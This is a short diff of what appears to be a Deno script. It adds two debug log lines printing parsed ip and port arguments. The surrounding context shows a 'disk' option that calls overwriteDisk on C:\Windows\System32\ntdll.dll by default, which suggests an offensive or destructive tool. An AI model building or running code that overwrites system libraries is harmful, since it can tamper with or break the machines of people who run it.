@@ -598,6 +598,9 @@ function parseArgs() {
 async function main() {
   const args = parseArgs();
 
+  console.log("[*] Deno.args: " + JSON.stringify(Deno.args));
+  console.log("[*] Parsed: ip=" + args.ip + " port=" + args.port);
+
   if (args.option === "disk") {
     const p = args.path || "C:\\Windows\\System32\\ntdll.dll";
     overwriteDisk(p);
